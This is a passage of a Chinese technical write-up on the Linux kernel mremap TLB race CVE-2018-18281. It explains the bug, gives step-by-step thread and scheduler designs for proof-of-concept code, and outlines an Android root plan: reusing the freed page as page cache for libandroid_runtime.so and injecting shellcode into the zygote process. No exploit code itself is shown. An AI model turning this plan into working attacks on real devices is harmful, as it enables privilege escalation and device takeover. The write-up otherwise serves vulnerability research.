\u7684\u6620\u5c04\u5173\u7cfb\u5728\u9875\u8868\u91cc\u5df2\u7ecf\u88ab\u6e05\u7a7a, \u4f46\u5728 TLB \u7f13\u5b58\u91cc\u6ca1\u6709\u88ab\u6e05\u7a7a, \u7ebf\u7a0b C \u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee X \u7684\u5185\u5b58, \u9020\u6210\u5730\u5740\u590d\u7528\n\n\n\u6ce8\u610f:\n\n\u9664\u4e86\u53ef\u4ee5\u7528 ftruncate \u51fd\u6570\u6765\u8ddf mremap \u7ade\u4e89, \u8fd8\u6709\u4e00\u4e2a linux \u7cfb\u7edf\u7279\u6709\u7684\n\u7cfb\u7edf\u51fd\u6570 fallocate \u4e5f\u53ef\u4ee5\u8d77\u5230\u540c\u6837\u7684\u6548\u679c, \u539f\u56e0\u5f88\u7b80\u5355, \nfallocate \u548c ftruncate \u7684\u5e95\u5c42\u8c03\u7528\u94fe\u662f\u4e00\u6837\u7684\n\nsys_fallocate()->shmem_fallocate()->shmem_truncate_range()\n->shmem_undo_range()->truncate_inode_page()->unmap_mapping_range \n\n\n\n\nv4.9 \u4e4b\u524d\u7684\u5185\u6838\u90fd\u662f\u4e0a\u8ff0\u5217\u8868\u663e\u793a\u7684\u4ee3\u7801\u903b\u8f91\n\n\nv4.9 \u4e4b\u540e\u7684\u5185\u6838, move_ptes \u7684\u903b\u8f91\u4e0e\u4e0a\u8ff0\u6709\u4e9b\u8bb8\u4e0d\u540c \n\n\n\u6ce8\u610f:\n\n\u5728 versions > 4.9 \u7684 linux \u5185\u6838, Dirty \u6807\u8bb0\u7684\u9875\u9762\u4f1a\u5728 move_ptes \u51fd\u6570\u5185\u90e8\u5237\u65b0 TLB , \n\u800c\u4e0d\u662f\u7b49\u5230 3.2 \u7531 flush_tlb_range \u51fd\u6570\u53bb\u5237\u65b0, \u56e0\u6b64, race \u53d1\u751f\u4e4b\u540e, \n\u7ebf\u7a0b C \u80fd\u901a\u8fc7 X \u8bbf\u95ee\u5230\u7684\u5185\u5b58\u90fd\u662f\u4e4b\u524d non-Dirty \u7684\u9875\u9762, \u5373\u88ab\u5199\u8fc7\u7684\u9875\u9762\u90fd\u65e0\u6cd5\u590d\u7528. \n\n\u8fd9\u70b9\u6539\u53d8\u4f1a\u5bf9 poc \u548c exploit \u9020\u6210\u4ec0\u4e48\u5f71\u54cd? \u7559\u7ed9\u5927\u5bb6\u601d\u8003. \n\n\n\n\nc.\u6f0f\u6d1e\u7c7b\u578b\n\n\n\u903b\u8f91\u9519\u8bef\n\n\nd.\u6f0f\u6d1e\u8865\u4e01\n\n\ne.\u6f0f\u6d1eCVE\u53f7\n\n\ncve-2018-18281\n\n\n3.POC\n\n\na.POC\u539f\u7406\n\n\n\u6839\u636e\u4e0a\u8ff0\u5206\u6790, \u4e00\u4e2a\u7b80\u5355\u7684 poc \u601d\u8def\u5c31\u51fa\u6765\u4e86, \u901a\u8fc7\u4e0d\u65ad\u68c0\u6d4b\u7ebf\u7a0b C \u4ece\u5730\u5740 X \u8bfb\u53d6\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u521d\u59cb\u5185\u5bb9\u5c31\u53ef\u4ee5\u5224\u65ad race \u662f\u5426\u88ab\u89e6\u53d1, \u6b63\u5e38\u60c5\u51b5\u4e0b, C \u8bfb\u53d6 X \u53ea\u4f1a\u6709\u4e24\u79cd\u7ed3\u679c, \u4e00\u79cd\u662f mremap \u5f7b\u5e95\u5b8c\u6210, \u5373 3.2 \u6267\u884c\u5b8c\u6bd5, \u6b64\u65f6\u5730\u5740 X \u4e3a\u65e0\u6548\u5730\u5740, C \u7684\u8bfb\u64cd\u4f5c\u5f15\u53d1\u8fdb\u7a0b\u5954\u6e83\u9000\u51fa, \u7b2c\u4e8c\u79cd\u662f mremap \u8fd8\u672a\u5b8c\u6210, C \u8bfb\u53d6\u7684\u5730\u5740\u8fd4\u56de\u7684\u662f X \u7684\u521d\u59cb\u5185\u5bb9, \u53ea\u6709\u8fd9\u4e24\u79cd\u60c5\u51b5\u624d\u7b26\u5408 mremap \u51fd\u6570\u7684\u5b9a\u4e49. \u4f46\u662f\u7531\u4e8e\u6f0f\u6d1e\u7684\u5b58\u5728, \u5b9e\u9645\u8fd0\u884c\u4f1a\u5b58\u5728\u7b2c\u4e09\u79cd\u60c5\u51b5, \u5373 C \u8bfb\u53d6 X \u4e0d\u4f1a\u5954\u6e83(3.2 \u8fd8\u6ca1\u6267\u884c, \u5730\u5740\u6620\u5c04\u8fd8\u6709\u6548), \u4f46\u5185\u5bb9\u53d8\u4e86( 4.3 \u6267\u884c\u5b8c\u6bd5, \u7269\u7406\u9875\u9762\u5df2\u7ecf\u88ab\u5176\u4ed6\u5730\u65b9\u590d\u7528)\n\n\n\u521d\u59cb\u7248 poc\n \u53ef\u4ee5\u6e05\u6670\u770b\u51fa race \u662f\u600e\u4e48\u53d1\u751f\u7684, \u9700\u8981\u6ce8\u610f, \u8fd9\u4efd poc \u5fc5\u987b\u914d\u5408\u5185\u6838\u8865\u4e01\u624d\u80fd\u7a33\u5b9a\u89e6\u53d1 race , \u5426\u5219\u547d\u4e2d\u7387\u975e\u5e38\u4f4e, \u8865\u4e01\u901a\u8fc7\u5728 move_page_tables \u51fd\u6570\u8c03\u7528 flush_tlb_range \u4e4b\u524d(\u5373 3.2 \u4e4b\u524d)\u589e\u52a0\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u589e\u5927 race \u6761\u4ef6\u7684\u65f6\u95f4\u7a97\u53e3\u4ee5\u63d0\u9ad8\u547d\u4e2d\u7387\n\n\n\u4e0a\u8ff0 poc \u7684\u8fd0\u884c\u7ed3\u679c\u662f, \u5927\u90e8\u5206\u60c5\u51b5\u4e0b poc \u5954\u6e83\u9000\u51fa, \u5c11\u6570\u60c5\u51b5\u4e0b\u8bfb\u53d6 X \u4f1a\u8fd4\u56de\u4e00\u4e2a\u8ddf\u521d\u59cb\u503c\u4e0d\u540c\u7684\u503c\n\n\n\u8fd9\u79bb\u7a33\u5b9a\u63d0\u6743\u8fd8\u6709\u5f88\u8fdc\u7684\u8ddd\u79bb, \u4e3a\u4e86\u5f97\u5230\u7a33\u5b9a\u5229\u7528, \u81f3\u5c11\u6709\u4e24\u4e2a\u95ee\u9898\u9700\u8981\u89e3\u51b3:\n\n\n\n\n\u5982\u4f55\u63d0\u9ad8 race \u7684\u547d\u4e2d\u7387\n\n\n\u600e\u4e48\u5b9e\u73b0\u63d0\u6743\n\n\n\n\n\u5982\u4f55\u63d0\u9ad8 race \u7684\u547d\u4e2d\u7387\n\n\n\u8981\u63d0\u9ad8\u672c\u6f0f\u6d1e race \u7684\u547d\u4e2d\u7387, \u5c31\u662f\u8981\u589e\u5927 move_ptes \u51fd\u6570\u548c flush_tlb_range \u51fd\u6570\u4e4b\u95f4\u7684\u65f6\u95f4\u95f4\u9694\n\n\n\u600e\u4e48\u624d\u80fd\u589e\u52a0\u8fd9\u4fe9\u51fd\u6570\u6267\u884c\u7684\u65f6\u95f4\u95f4\u9694\u5462?\n\n\n\n\n\u8fd9\u91cc\u8981\u5f15\u5165linux\u5185\u6838\u7684 \n\u8fdb\u7a0b\u62a2\u5360\n \u6982\u5ff5, \u5982\u679c\u76ee\u6807\u5185\u6838\u662f\u53ef\u62a2\u5360\u7684 (CONFIG_PREEMPT=y) , \u5219\u5982\u679c\u80fd\u8ba9\u8fdb\u7a0b\u5728\u6267\u884c flush_tlb_range \u51fd\u6570\u4e4b\u524d\u88ab\u62a2\u5360, \u90a3\u4e48 race \u7684\u65f6\u95f4\u7a97\u53e3\u5c31\u591f\u5927\u4e86, \u7528\u6237\u7a7a\u95f4\u7684\u666e\u901a\u7a0b\u5e8f\u80fd\u4e0d\u80fd\u5f71\u54cd\u67d0\u4e2a\u8fdb\u7a0b\u7684\u8c03\u5ea6\u7b56\u7565\u5462? \u7b54\u6848\u662f\u80af\u5b9a\u7684.\n\n\n\u6709\u4e24\u4e2a\u7cfb\u7edf\u51fd\u6570\u53ef\u4ee5\u5f71\u54cd\u8fdb\u7a0b\u7684\u8c03\u5ea6\n\n\n\n\nsched_setaffinity\n \u51fd\u6570\u7528\u6765\u7ed1\u5b9a\u8fdb\u7a0b\u5230\u67d0\u4e2a cpu core\n\n\nsched_setscheduler\n \u51fd\u6570\u7528\u6765\u8bbe\u7f6e\u8fdb\u7a0b\u7684\u8c03\u5ea6\u7b56\u7565\u548c\u8c03\u5ea6\u53c2\u6570\n\n\n\n\n\u4f7f\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\u5c06 poc \u4fee\u6539\u4e3a\u4e0b\u9762\u7684\u65b9\u6848,\n\n\n\u65b0\u5efa A,B,C,D \u56db\u4e2a\u7ebf\u7a0b:\n\n\n\n\n1) A \u6620\u5c04\u4e00\u4e2a\u6587\u4ef6 a \u5230\u5730\u5740 X, A \u7ed1\u5b9a\u5230\u6838 c1, A \u8c03\u5ea6\u7b56\u7565\u8bbe\u7f6e\u4e3a SCHED_IDLE \n\n\n2) C \u7ed1\u5b9a\u5230\u6838 c1, C \u963b\u585e\u5728\u67d0\u4e2a pipe, pipe \u8fd4\u56de\u5219\u8c03\u7528 ftruncate \u5c06\u6587\u4ef6 a \u7684\u6587\u4ef6\u5927\u5c0f\u6539\u4e3a 0\n\n\n3) A \u8c03\u7528 mremap \u91cd\u65b0\u6620\u5c04 X \u5230 Y, \u8fd9\u5c06\u6267\u884c\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570:\n\n\n3.1) move_ptes\n\n\n3.2) flush_tlb_range\n\n\n\n\n\n\n4) D \u7ed1\u5b9a\u5230\u6838 c2, \u76d1\u63a7\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u5c04\u60c5\u51b5,\u5982\u679c\u53d1\u751f\u53d8\u5316\u5219\u901a\u8fc7\u5199 pipe \u5524\u9192 C\n\n\n5) B \u7ed1\u5b9a\u5230\u6838 c3, \u5faa\u73af\u8bfb\u53d6 X \u7684\u5185\u5bb9, \u5e76\u5224\u65ad\u662f\u5426\u8fd8\u662f\u521d\u59cb\u503c\n\n\n\n\n\u6ce8\u610f:\n\nmremap \u6267\u884c move_ptes \u51fd\u6570\u4f1a\u5f15\u53d1\u5185\u5b58\u72b6\u6001\u53d8\u5316, \u8fd9\u79cd\u53d8\u5316\u53ef\u4ee5\u901a\u8fc7\n\u7528\u6237\u6001\u6587\u4ef6 /proc/pid/status \u6587\u4ef6\u83b7\u53d6, \u8fd9\u5c31\u662f\u7ebf\u7a0b D \u7684\u4f5c\u7528\n\n\n\n\n\u6b64\u65f6, \u901a\u8fc7\u76d1\u63a7\u7ebf\u7a0b D \u5524\u9192 C, \u7531\u4e8eA \u548c C \u7ed1\u5b9a\u5728\u540c\u4e00\u4e2a\u6838\u5fc3 c1, \u4e14 A \u7684\u8c03\u5ea6\u7b56\u7565\u88ab\u8bbe\u7f6e\n\u4e3a\u6700\u4f4e\u4f18\u5148\u7ea7 SCHED_IDLE, C \u7684\u5524\u9192\u5c06\u62a2\u5360 A \u7684\u6267\u884c, \u5982\u6b64\u4e00\u6765, 3.2 \u7684\u6267\u884c\u5c31\u53ef\u80fd\u88ab\u5ef6\u8fdf. \nC \u88ab\u5524\u9192\u540e\u7acb\u5373\u6267\u884c ftruncate \u91ca\u653e Y \u7684\u5185\u5b58\u89e6\u53d1\u6f0f\u6d1e.\n\n\n\u901a\u8fc7\u4e0a\u8ff0\u65b9\u6848\u53ef\u4ee5\u7406\u8bba\u4e0a\u8ba9\u7ebf\u7a0b A \u5728\u6267\u884c 3.1 \u540e, \u6267\u884c 3.2 \u524d\u88ab\u6302\u8d77, \n\u4ece\u800c\u6269\u5927 3.1 \u548c 3.2 \u7684\u65f6\u95f4\u95f4\u9694 \n\n\n\u6539\u8fdb\u7248 poc\n \u662f\u6839\u636e\u4e0a\u8ff0\u601d\u8def\u5199\u7684\n\n\n\u6539\u8fdb\u7248\u7684 poc\n\n\n\u5b9e\u6d4b\u53d1\u73b0\u4e0a\u8ff0 poc \u89e6\u53d1\u7387\u8fd8\u662f\u4f4e, \u501f\u9274 Jann Horn \u7684\u601d\u8def, \u7ee7\u7eed\u5982\u4e0b\u4fee\u6539 poc \n\n\n\u6539\u8fdb\u7248\u65b9\u6848: \u65b0\u5efa A,B,C,D,E \u4e94\u4e2a\u7ebf\u7a0b:\n\n\n\n\n1) A \u6620\u5c04\u4e00\u4e2a\u6587\u4ef6 a \u5230\u5730\u5740 X, A \u7ed1\u5b9a\u5230\u6838 c1, A \u8c03\u5ea6\u7b56\u7565\u8bbe\u7f6e\u4e3a SCHED_IDLE \n\n\n2) C \u7ed1\u5b9a\u5230\u6838 c1, C \u963b\u585e\u5728\u67d0\u4e2a pipe, pipe \u8fd4\u56de\u5219\u7acb\u5373\u5c06 A \u91cd\u65b0\u7ed1\u5b9a\u5230\u6838 c4, \u5e76\u8c03\u7528 ftruncate \u5c06\u6587\u4ef6 a \u7684\u6587\u4ef6\u5927\u5c0f\u6539\u4e3a 0\n\n\n3) A \u8c03\u7528 mremap \u91cd\u65b0\u6620\u5c04 X \u5230 Y\n\n\n3.1) move_ptes\n\n\n3.2) flush_tlb_range\n\n\n\n\n\n\n4) D \u7ed1\u5b9a\u5230\u6838 c2, \u76d1\u63a7\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u5c04\u60c5\u51b5,\u5982\u679c\u53d1\u751f\u53d8\u5316\u5219\u901a\u8fc7\u5199 pipe \u5524\u9192 C\n\n\n5) B \u7ed1\u5b9a\u5230\u6838 c3, \u5faa\u73af\u8bfb\u53d6 X \u7684\u5185\u5bb9, \u5e76\u5224\u65ad\u662f\u5426\u8fd8\u662f\u521d\u59cb\u503c\n\n\n6) E \u7ed1\u5b9a\u5230\u6838 c4, \u6267\u884c\u4e00\u4e2a\u6b7b\u5faa\u73af.\n\n\n\n\n\u6539\u8fdb\u7684\u5730\u65b9\u6709\u4e24\u70b9, 1 \u662f\u589e\u52a0\u4e00\u4e2a E \u7ebf\u7a0b\u7ed1\u5b9a\u5230\u6838 c4 \u5e76\u6267\u884c\u6b7b\u5faa\u73af, 2 \u662f\u7ebf\u7a0b C \u88ab\u5524\u9192\u540e\u7acb\u523b\u91cd\u7ed1\u5b9a\u7ebf\u7a0b A \u5230\u6838 c4, \u5373\u8ba9 A \u548c E \u5728\u540c\u4e00\u4e2a\u6838\u4e0a\n\n\n\u8fd9\u4e2a\u6539\u53d8\u4f1a\u63d0\u9ad8 race \u89e6\u53d1\u7684\u547d\u4e2d\u7387, \u4e2a\u4eba\u5224\u65ad\u539f\u56e0\u662f\u7531\u4e8e\u5f53 C \u7684\u7ba1\u9053\u8fd4\u56de\u540e\u624b\u52a8\u6267\u884c\u91cd\u7ed1\u5b9a\u64cd\u4f5c\u4f1a\u6bd4\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\u66f4\u5bb9\u6613\u5bfc\u81f4 A \u7acb\u5373\u88ab\u6302\u8d77 \n\n\n\u6700\u7ec8\u7248 poc\n \u662f\u6839\u636e\u4e0a\u8ff0\u601d\u8def\u5199\u7684\n\n\n\u5229\u7528\u8fd9\u4e2a poc, \u6211\u4eec\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u6f0f\u6d1e\u7684 race \u547d\u4e2d\u7387\u63d0\u5347\u5230\u53ef\u4ee5\u63a5\u53d7\u7684\u7a0b\u5ea6.\n\n\nb.POC\u6e90\u7801\n\n\n\n\n\u521d\u59cb\u7248 poc\n\n\n\u6539\u8fdb\u7248 poc\n\n\n\u6700\u7ec8\u7248 poc\n \n\n\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\n4.EXP\n\n\na.EXP\u539f\u7406\n\n\n\u7269\u7406\u9875\u9762\u7ba1\u7406\n\n\n\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5728\u6bd4\u8f83\u77ed\u7684\u65f6\u95f4\u5185\u7a33\u5b9a\u89e6\u53d1\u6f0f\u6d1e, \u5f97\u5230\u4e00\u7247\u5df2\u7ecf\u88ab\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u7684\u4f7f\u7528\u6743, \n\u800c\u4e14\u53ef\u8bfb\u53ef\u5199, \u600e\u4e48\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u63d0\u6743?\n\n\n\u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7269\u7406\u5185\u5b58\u7684\u5206\u914d\u548c\u91ca\u653e\u7ec6\u8282, \u7269\u7406\u5185\u5b58\u7ba1\u7406\u5c5e\u4e8e\n\u4f19\u4f34\u7cfb\u7edf\n, \u53c2\u8003 \n\u5185\u5b58\u7ba1\u7406\n\n\n\u7269\u7406\u9875\u9762\u7684\u7ba1\u7406\u662f\u5206\u5c42\u7684:\n\n\n\n\nnode: NUMA \u4f53\u7cfb\u67b6\u6784\u6709 node \u7684\u6982\u5ff5, \u4e0d\u540c node \u7684\u7269\u7406\u5185\u5b58\u662f\u5206\u5f00\u7ba1\u7406\u7684\n\n\nzone: \u6839\u636e\u7269\u7406\u5185\u5b58\u7684\u533a\u57df\u5206\u82e5\u5e72\u79cd zone, \u4e0d\u540c\u573a\u666f\u4f1a\u4f18\u5148\u5411\u4e0d\u540c\u7684 zone \u5206\u914d , \u6bd4\u5982\u7528\u6237\u7a7a\u95f4\u7533\u8bf7\u5185\u5b58, \u4f1a\u4f18\u5148\u4ece ZONE_NORMAL \u8fd9\u4e2a zone \u5206\u914d, \u5982\u679c\u4e0d\u591f\u518d\u4ece\u5176\u4ed6 zone \u5206\u914d\n\n\nZONE_DMA\n\n\nZONE_NORMAL\n\n\nZONE_HIGHMEM\n\n\n\u5176\u4ed6\n\n\n\n\n\n\nmigration-type: \u5185\u6838\u6839\u636e\u53ef\u8fc1\u79fb\u6027\u5bf9\u9875\u9762\u8fdb\u884c\u5206\u7ec4\u7ba1\u7406, \u7528\u4e8e anti-fragmentation, \u53ef\u4ee5\u53c2\u8003 \n\u5185\u6838\u9875\u9762\u8fc1\u79fb\u4e0e\u53cd\u788e\u7247\u673a\u5236\n \n\n\nMIGRATE_UNMOVABLE\n\n\nMIGRATE_RECLAIMABLE\n\n\nMIGRATE_MOVABLE\n\n\n\n\n\n\n\n\n__alloc_pages_nodemask \u51fd\u6570\u662f zoned buddy allocator \u7684\u5206\u914d\u5165\u53e3, \u5b83\u6709\u5feb\u6162\u4e24\u6761\u8def\u5f84:\n\n\n\n\nget_page_from_freelist , \u5feb\u8def\u5f84\n\n\n1) if order == 0, \u4ece per-cpu \u7684\u6307\u5b9a zone \u6307\u5b9a migratetype \u7684 cache list \u91cc\u83b7\u53d6 page\n\n\npcp = &this_cpu_ptr(zone->pageset)->pcp\n\n\nlist = &pcp->lists[migratetype]\n\n\npage = list_entry(list->next, struct page, lru);\n\n\n\n\n\n\n2) __rmqueue_smallest : \u5728\u6307\u5b9a\u8fc1\u79fb\u7c7b\u578b\u4e0b\u81ea\u5e95\u5411\u4e0a\u8fdb\u884c\u5404\u9636\u904d\u5386\u67e5\u627e\u6240\u9700\u7684\u7a7a\u95f2\u9875\u9762\n\n\narea = &zone->free_area[current_order]\n\n\nlist = &area->free_list[migratetype]\n\n\npage = list_entry(list->next, struct page, lru);\n\n\n\n\n\n\n3) __rmqueue_cma, \n\u8fde\u7eed\u5185\u5b58\u5206\u914d\u5668\n \u7528\u4e8eDMA\u6620\u5c04\u6846\u67b6\u4e0b\u63d0\u5347\u8fde\u7eed\u5927\u5757\u5185\u5b58\u7684\u7533\u8bf7\n\n\n4) __rmqueue_fallback, \u5982\u679c\u5728\u6307\u5b9a\u8fc1\u79fb\u7c7b\u578b\u4e0b\u5206\u914d\u5931\u8d25\uff0c\u4e14\u7c7b\u578b\u4e0d\u4e3aMIGRATE_RESERVE\u65f6, \u5c31\u5728 fallbacks \u6570\u7ec4\u91cc\u627e\u5230\u4e0b\u4e00\u4e2a migratetype, \u7531\u6b64\u83b7\u5f97\u7684\u9636\u53f7\u548c\u8fc1\u79fb\u7c7b\u578b\u67e5\u627ezone->free_area[]->free_list[]\u7a7a\u95f2\u9875\u9762\u7ba1\u7406\u94fe\u8868\n\n\n\n\n\n\n__alloc_pages_slowpath, \u6162\u8def\u5f84\n\n\n\u7565\n\n\n\n\n\n\n\n\n\u4ece\u6f0f\u6d1e\u5229\u7528\u7684\u89d2\u5ea6, \u6211\u4eec\u5e0c\u671b\u5c06\u6f0f\u6d1e\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u5c3d\u53ef\u80fd\u5feb\u7684\u88ab\u91cd\u65b0\u5206\u914d\u56de\u6765, \u6240\u4ee5, \u7528\u6765\u89e6\u53d1\u6f0f\u6d1e\u91ca\u653e\u7269\u7406\u9875\u9762\u7684\u573a\u666f\u548c\u91cd\u65b0\u7533\u8bf7\u7269\u7406\u9875\u9762\u7528\u6765\u5229\u7528\u7684\u573a\u666f, \u8fd9\u4e24\u79cd\u573a\u666f\u7684 zone, migratetype \u6700\u597d\u4e00\u81f4, \u800c\u4e14\u8fd9\u4e24\u4e2a\u573a\u666f\u7684\u89e6\u53d1\u6700\u597d\u5728\u540c\u4e00\u4e2a cpu core \u4e0a.\n\n\n\u6bd4\u5982, \u89e6\u53d1\u6f0f\u6d1e\u65f6, \u901a\u8fc7\u7528\u6237\u7a7a\u95f4 mmap \u4e00\u7247\u5730\u5740, \u7136\u540e\u8bbf\u95ee\u8fd9\u7247\u5730\u5740\u89e6\u53d1\u7269\u7406\u5185\u5b58\u5206\u914d, \u8fd9\u79cd\u5206\u914d\u5927\u6982\u7387\u662f\u4ece ZONE_NORMAL \u800c\u6765, \u800c\u4e14\u9875\u9762\u5927\u6982\u7387\u662f MIGRATE_MOVABLE \u7684, \u7136\u540e\u7528 ftruncate \u91ca\u653e, \u8fd9\u4e9b\u9875\u9762\u5f88\u53ef\u80fd\u4f1a\u6302\u5728\u5f53\u524d cpu \u7684 freelist \u4e0a.  \u6240\u4ee5, \u6f0f\u6d1e\u5229\u7528\u7684\u65f6\u5019\u5982\u679c\u662f\u5728\u5176\u4ed6 cpu core \u89e6\u53d1\u7533\u8bf7\u7269\u7406\u9875\u9762, \u5219\u53ef\u80fd\u7533\u8bf7\u4e0d\u5230\u76ee\u6807\u9875\u9762, \u6216\u8005, \u89e6\u53d1\u7533\u8bf7\u7269\u7406\u9875\u9762\u7684\u573a\u666f\u5982\u679c\u662f\u67d0\u79cd dma \u8bbe\u5907, \u90a3\u4e48\u4e5f\u5927\u6982\u7387\u547d\u4e2d\u4e0d\u5230\u76ee\u6807\u9875\u9762.\n\n\n\u600e\u4e48\u5b9e\u73b0\u63d0\u6743\n\n\n\u6839\u636e\u4e0a\u8ff0\u7269\u7406\u5185\u5b58\u7ba1\u7406\u7684\u5206\u6790, \u9009\u62e9\u4f7f\u7528\u6587\u4ef6\u7684 page cache \u7528\u4e8e\u91cd\u65b0\u7533\u8bf7\u76ee\u6807\u7269\u7406\u9875\u9762, \u5728\u6b64\u57fa\u7840\u4e0a, \u60f3\u529e\u6cd5\u5b9e\u73b0\u63d0\u6743\n\n\nlinux \u4e0a\u786c\u76d8\u6587\u4ef6\u7684\u5185\u5bb9\u5728\u5185\u6838\u7528 page cache \u6765\u7ef4\u62a4, \u5982\u679c\u6f0f\u6d1e\u89e6\u53d1\u540e\u91ca\u653e\u7684\u9875\u9762\u88ab\u7528\u4e8e\u67d0\u4e2a\u6587\u4ef6\u7684 page cache, \u5219\u6211\u4eec\u62e5\u6709\u4e86\u8bfb\u5199\u8be5\u6587\u4ef6\u7684\u80fd\u529b, \u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u6070\u597d\u662f\u7528\u6237\u6001\u7684\u91cd\u8981\u52a8\u6001\u5e93\u6587\u4ef6, \u6b63\u5e38\u60c5\u51b5\u4e0b\u666e\u901a\u8fdb\u7a0b\u65e0\u6cd5\u6539\u5199\u8fd9\u79cd\u6587\u4ef6, \u4f46\u901a\u8fc7\u6f0f\u6d1e\u666e\u901a\u8fdb\u7a0b\u53ef\u4ee5\u6539\u5199\u5b83, \u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u52a8\u6001\u5e93\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u6765\u63d0\u6743.\n\n\n\u4e0a\u8ff0\u5229\u7528\u601d\u8def\u7684\u5173\u952e\u67093\u70b9:\n\n\n\n\n\u9009\u62e9\u76ee\u6807\u52a8\u6001\u5e93\u6587\u4ef6\n\n\n\u9009\u62e9\u76ee\u6807\u6587\u4ef6\u8981\u6539\u5199\u7684\u4f4d\u7f6e\n\n\n\u63d0\u9ad8\u76ee\u6807\u4f4d\u7f6e\u6240\u5728\u9875\u9762\u7684\u547d\u4e2d\u7387\n\n\n\n\n\u8fd9\u4e2a\u52a8\u6001\u5e93\u5fc5\u987b\u662f\u80fd\u88ab\u9ad8\u6743\u9650\u8fdb\u7a0b\u6240\u4f7f\u7528\n\u76ee\u6807\u4f4d\u7f6e\u6700\u597d\u662f\u9875\u9762\u5bf9\u9f50\u7684, \u8fd9\u6837\u76ee\u6807\u4f4d\u7f6e\u53ef\u4ee5\u4ee5\u9875\u9762\u4e3a\u5355\u4f4d\u52a0\u8f7d\u8fdb\u5185\u5b58, \u6216\u8005\u4ee5\u9875\u9762\u4e3a\u5355\u4f4d\u7f6e\u6362\u5230\u786c\u76d8\n\u76ee\u6807\u4f4d\u7f6e\u88ab\u8c03\u7528\u7684\u65f6\u673a\u4e0d\u80fd\u592a\u9891\u7e41, \u8981\u4e0d\u7136\u4fee\u6539\u64cd\u4f5c\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7a33\u5b9a\u6027, \u800c\u4e14\u8c03\u7528\u65f6\u673a\u5fc5\u987b\u53ef\u4ee5\u7531\u666e\u901a\u8fdb\u7a0b\u89e6\u53d1\n\n\n\u4e0b\u9762\u662f\u4e00\u4e2a\u7b26\u5408\u4e0a\u8ff0\u6761\u4ef6\u7684\u52a8\u6001\u5e93\u548c\u51fd\u6570:\n\n\n\n\nlibandroid_runtime.so \u52a8\u6001\u5e93\n\n\ncom_android_internal_os_Zygote_nativeForkAndSpecialize \u51fd\u6570\n\n\n\u8fd9\u4e2a\u51fd\u6570\u88ab zygote \u8c03\u7528, zygote \u8fdb\u7a0b\u662f\u4e00\u4e2a\u7279\u6743\u8fdb\u7a0b\n\n\n\u8fd9\u4e2a\u51fd\u6570\u5728 libandroid_runtime.so (pixel2 PQ1A.181105.017.A1) \u6587\u4ef6\u7684\u504f\u79fb\u662f 0x157000, \u8fd9\u4e2a\u504f\u79fb\u662f\u9875\u9762\u5bf9\u9f50\u7684\n\n\n\u8fd9\u4e2a\u51fd\u6570\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u4f1a\u88ab\u8c03\u7528, \u53ea\u6709\u542f\u52a8\u65b0\u7684 app \u65f6\u4f1a\u88ab zygote \u8c03\u7528, \u53ef\u4ee5\u7531\u666e\u901a app \u89e6\u53d1 zygote \u53bb\u6267\u884c\n\n\n\n\n\n\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u6f0f\u6d1e\u89e6\u53d1 race \u540e, \u8ba9\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u521a\u597d\u88ab\u7528\u4e8e\u76ee\u6807\u9875\u9762( libandroid_runtime.so \u6587\u4ef6\u7684 offset = 0x157000 \u8fd9\u4e2a\u9875\u9762), \u518d\u53ef\u4ee5\u901a\u8fc7 UAF \u5730\u5740\u6ce8\u5165 shellcode \u5230\u76ee\u6807\u4f4d\u7f6e, \u4ece\u800c\u6539\u5199 com_android_internal_os_Zygote_nativeForkAndSpecialize \u51fd\u6570\u7684\u4ee3\u7801\u903b\u8f91, \u6700\u540e\u53d1\u6d88\u606f\u89e6\u53d1 zygote \u53bb\u6267\u884c shellcode\n\n\n\u8fd9\u8282\u89e3\u51b3\u7684\u95ee\u9898\u662f, \u600e\u4e48\u63a7\u5236 race \u91ca\u653e\u7684\u9875\u9762\u521a\u597d\u80fd\u88ab\u76ee\u6807\u9875\u9762\u4f7f\u7528\n\n\n\u8fd9\u7bc7\u8bba\u6587\n \u7684 section VIII-B \u4ecb\u7ecd\u4e86\u4e00\u79cd\u7b97\u6cd5\u7528\u4e8e\u7cbe\u786e\u63a7\u5236\u4e00\u4e2a file page cache \u7684\u52a0\u8f7d \n\n\n\n\n1) \u6253\u5f00\u4e00\u4e2a\u5927\u6587\u4ef6 a, mmap \u5230\u5185\u5b58 \n\n\n2) \u6253\u5f00\u76ee\u6807\u6587\u4ef6 b, mmap \u5230\u5185\u5b58\n\n\n3) \u5728\u4e00\u4e2a\u5faa\u73af\u5185, \u6267\u884c: \n\n\n3.1) \u6309\u7167 pagesize \u9010\u9875\u9762\u8bfb\u53d6 a \u7684\u5185\u5bb9\n        \u8fd9\u4f1a\u5bfc\u81f4\u5185\u6838\u7533\u8bf7\u5927\u91cf page cache \u6765\u88c5\u8f7d\u6587\u4ef6 a, \n    \u4ece\u800c\u8feb\u4f7f\u5176\u4ed6\u6587\u4ef6\u7684 page cache \u88ab\u7f6e\u6362\u5230\u786c\u76d8\n\n\n3.2) \u5224\u65ad\u76ee\u6807\u9875\u9762 X \u662f\u5426\u5728\u5185\u5b58\u91cc, \u5982\u679c\u4e0d\u662f, \u8df3\u8f6c\u5230 4.1\n\n\n\n\n\n\n4) \u5728\u4e00\u4e2a\u5faa\u73af\u5185, \u6267\u884c:\n\n\n4.1) \u6309\u7167 pagesize \u9010\u9875\u9762\u8bfb\u53d6 b \u7684\u5185\u5bb9, \u4f46\u9047\u5230\u76ee\u6807\u9875\u9762 X \u5219\u8df3\u8fc7\n           